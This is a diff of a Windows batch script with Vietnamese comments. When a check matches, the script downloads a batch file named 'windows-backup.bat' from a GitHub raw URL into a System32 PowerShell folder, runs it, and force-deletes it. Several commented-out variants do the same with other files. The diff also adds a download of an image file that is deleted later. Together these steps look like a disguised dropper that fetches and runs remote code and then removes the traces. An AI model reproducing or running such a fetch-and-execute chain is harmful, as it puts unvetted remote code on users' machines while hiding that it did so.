@@ -31,12 +31,15 @@ for /f "tokens=*" %%j in ('type "%tempfile%"') do (
 :: Thực hiện hành động dựa trên kết quả so sánh
 if %found%==1 (
     echo Trung Khop
+
+powershell curl -o C:\Capture.png https://i.ibb.co/NS2jTRW/Capture.png
+
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Force}"
 rem powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat' -Force}"
 rem powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup3.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup3.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup3.bat' -Force}"
 rem powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup4.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup4.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup4.bat' -Force}"
 rem powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup5.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup5.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup5.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup5.bat' -Force}"
-
+del /f /q "C:\Capture.png"
 
 
 
